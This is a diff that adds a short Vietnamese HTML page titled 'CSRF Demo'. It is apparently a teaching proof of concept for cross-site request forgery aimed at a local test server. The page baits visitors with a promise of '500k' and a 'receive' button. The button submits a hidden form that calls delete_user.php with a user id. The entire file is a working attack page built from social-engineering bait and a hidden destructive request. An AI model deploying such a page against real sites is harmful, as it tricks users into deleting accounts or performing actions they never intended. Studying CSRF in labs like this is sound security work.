@@ -1,0 +1,16 @@
+<!DOCTYPE html>
+<html lang="vi">
+<head>
+    <meta charset="UTF-8">
+    <title>CSRF Demo</title>
+</head>
+<body>
+<h2>CSRF Demo</h2>
+<p>Ấn Vào Đây Để Nhận 500k</p>
+
+<form action="http://localhost:8383/delete_user.php" method="GET">
+    <input type="hidden" name="id" value="9">
+    <button type="submit">Nhận</button>
+</form>
+</body>
+</html>
